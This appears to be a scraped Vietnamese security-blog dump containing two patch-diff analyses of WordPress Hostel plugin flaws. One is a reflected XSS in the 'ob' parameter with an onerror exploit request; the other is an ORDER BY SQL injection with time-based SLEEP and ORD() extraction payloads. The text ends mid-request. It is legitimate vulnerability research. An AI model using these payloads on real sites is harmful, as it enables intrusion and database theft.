file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET 